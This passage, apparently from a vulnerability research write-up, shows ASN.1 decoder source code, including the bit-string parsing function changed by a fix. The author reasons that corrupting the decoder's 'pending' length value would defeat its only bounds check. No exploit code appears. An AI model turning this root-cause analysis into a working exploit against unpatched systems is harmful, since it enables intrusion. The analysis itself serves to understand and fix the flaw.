class=\"c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;top&lt;/span&gt;&lt;span class=\"c1\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c1\"&gt;||&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c23\"&gt;/* If parent-&amp;gt;indefinite is true, parent-&amp;gt;contents_length is&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c23\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* zero and this is a no-op. */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c1\"&gt;!&lt;/span&gt;&lt;span class=\"c3\"&gt;sec_asn1d_check_and_subtract_length&lt;/span&gt;&lt;span class=\"c1\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"c3\"&gt;remaining&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;parent&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;contents_length&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;top&lt;/span&gt;&lt;span class=\"c1\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c1\"&gt;||&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c23\"&gt;/* If parent-&amp;gt;indefinite is true, then ensure there is enough&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c23\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* space for an EOC tag of 2 bytes. */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; parent&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c2\"&gt;indefinite&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c1\"&gt;!&lt;/span&gt;&lt;span class=\"c3\"&gt;sec_asn1d_check_and_subtract_length&lt;/span&gt;&lt;span class=\"c1\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"c3\"&gt;remaining&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c11\"&gt;2&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;top&lt;/span&gt;&lt;span class=\"c1\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c1\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c1\"&gt;)&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c23\"&gt;/* This element is larger than its enclosing element, which is&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c23\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* invalid. */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c16\"&gt;return&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c1\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1\"&gt;}&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c16\"&gt;while&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;((&lt;/span&gt;&lt;span class=\"c3\"&gt;parent &lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;sec_asn1d_get_enclosing_construct&lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c3\"&gt;parent&lt;/span&gt;&lt;span class=\"c1\"&gt;))&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;parent&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;indefinite&lt;/span&gt;&lt;span class=\"c1\"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span&gt;It first walks up the state stack to find the innermost constructed definite state and uses its &lt;/span&gt;&lt;span class=\"c7\"&gt;state-&amp;gt;pending&lt;/span&gt;&lt;span&gt;&amp;nbsp;value as an upper bound. It then walks the state stack again and for each in-between state subtracts from that original value of &lt;/span&gt;&lt;span class=\"c7\"&gt;pending&lt;/span&gt;&lt;span&gt;&amp;nbsp;how many bytes could have been consumed by those in between states. It&amp;#39;s pretty clear that the &lt;/span&gt;&lt;span class=\"c7\"&gt;pending&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;value is therefore vitally important; it&amp;#39;s used to determine an upper bound so if we could mess with it this &amp;quot;bounds check&amp;quot; could go wrong.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span class=\"c9\"&gt;After figuring out that this was pretty clearly the only place where any kind of bounds checking takes place I looked back at the fix more closely.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span&gt;We know that &lt;/span&gt;&lt;span class=\"c7\"&gt;sec_asn1d_parse_bit_string&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;is only the function which changed:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.42f4c91c05b2a51603f4110e33201853c8d03da3\"&gt;&lt;/a&gt;&lt;a id=\"t.11\"&gt;&lt;/a&gt;&lt;table class=\"c25\"&gt;&lt;tbody&gt;&lt;tr class=\"c18\"&gt;&lt;td class=\"c5\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c16\"&gt;static&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c16\"&gt;unsigned&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c16\"&gt;long&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;sec_asn1d_parse_bit_string &lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c3\"&gt;sec_asn1d_state &lt;/span&gt;&lt;span class=\"c1\"&gt;*&lt;/span&gt;&lt;span class=\"c3\"&gt;state&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c16\"&gt;const&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c16\"&gt;char&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;*&lt;/span&gt;&lt;span class=\"c3\"&gt;buf&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c16\"&gt;unsigned&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c16\"&gt;long&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;len&lt;/span&gt;&lt;span class=\"c1\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c16\"&gt;unsigned&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c16\"&gt;char&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c16\"&gt;byte&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c23\"&gt;/*PORT_Assert (state-&amp;gt;pending &amp;gt; 0); */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; PORT_Assert &lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c3\"&gt;state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;place &lt;/span&gt;&lt;span class=\"c1\"&gt;==&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;beforeBitString&lt;/span&gt;&lt;span class=\"c1\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c14\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c16\"&gt;if&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;((&lt;/span&gt;&lt;span class=\"c3\"&gt;state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;pending &lt;/span&gt;&lt;span class=\"c1\"&gt;==&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11\"&gt;0&lt;/span&gt;&lt;span class=\"c1\"&gt;)&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1 c12\"&gt;||&lt;/span&gt;&lt;span class=\"c3 c12\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1 c12\"&gt;(&lt;/span&gt;&lt;span class=\"c3 c12\"&gt;state&lt;/span&gt;&lt;span class=\"c1 c12\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3 c12\"&gt;contents_length &lt;/span&gt;&lt;span class=\"c1 c12\"&gt;==&lt;/span&gt;&lt;span class=\"c3 c12\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11 c12\"&gt;1&lt;/span&gt;&lt;span class=\"c1 c12\"&gt;)&lt;/span&gt;&lt;span class=\"c1\"&gt;)&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c16\"&gt;if&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c3\"&gt;state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;dest &lt;/span&gt;&lt;span class=\"c1\"&gt;!=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class=\"c1\"&gt;)&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c20\"&gt;SecAsn1Item&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;*&lt;/span&gt;&lt;span class=\"c3\"&gt;item &lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c20\"&gt;SecAsn1Item&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;*)(&lt;/span&gt;&lt;span class=\"c3\"&gt;state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;dest&lt;/span&gt;&lt;span class=\"c1\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; item&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c20\"&gt;Data&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; item&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c20\"&gt;Length&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11\"&gt;0&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;place &lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;beforeEndOfContents&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c1\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3 c12\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c16 c12\"&gt;if&lt;/span&gt;&lt;span class=\"c1 c12\"&gt;(&lt;/span&gt;&lt;span class=\"c3 c12\"&gt;state&lt;/span&gt;&lt;span class=\"c1 c12\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3 c12\"&gt;contents_length &lt;/span&gt;&lt;span class=\"c1 c12\"&gt;==&lt;/span&gt;&lt;span class=\"c3 c12\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11 c12\"&gt;1&lt;/span&gt;&lt;span class=\"c1 c12\"&gt;)&lt;/span&gt;&lt;span class=\"c3 c12\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1 c12\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3 c12\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c23 c12\"&gt;/* skip over (unused) remainder byte */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3 c12\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c12 c16\"&gt;return&lt;/span&gt;&lt;span class=\"c3 c12\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11 c12\"&gt;1&lt;/span&gt;&lt;span class=\"c1 c12\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3 c12\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c1 c12\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3 c12\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c16 c12\"&gt;else&lt;/span&gt;&lt;span class=\"c3 c12\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1 c12\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3 c12\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c16 c12\"&gt;return&lt;/span&gt;&lt;span class=\"c3 c12\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11 c12\"&gt;0&lt;/span&gt;&lt;span class=\"c1 c12\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3 c12\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c1 c12\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c1\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c16\"&gt;if&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c3\"&gt;len &lt;/span&gt;&lt;span class=\"c1\"&gt;==&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11\"&gt;0&lt;/span&gt;&lt;span class=\"c1\"&gt;)&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;top&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;status &lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;needBytes&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c16\"&gt;return&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11\"&gt;0&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c1\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c16\"&gt;byte&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c16\"&gt;unsigned&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c16\"&gt;char&lt;/span&gt;&lt;span class=\"c1\"&gt;)&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;*&lt;/span&gt;&lt;span class=\"c3\"&gt;buf&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c16\"&gt;if&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c16\"&gt;byte&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11\"&gt;7&lt;/span&gt;&lt;span class=\"c1\"&gt;)&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; dprintf&lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c22\"&gt;&amp;quot;decodeError: parse_bit_string remainder oflow\\n&amp;quot;&lt;/span&gt;&lt;span class=\"c1\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; PORT_SetError &lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c3\"&gt;SEC_ERROR_BAD_DER&lt;/span&gt;&lt;span class=\"c1\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;top&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;status &lt;/span&gt;&lt;span 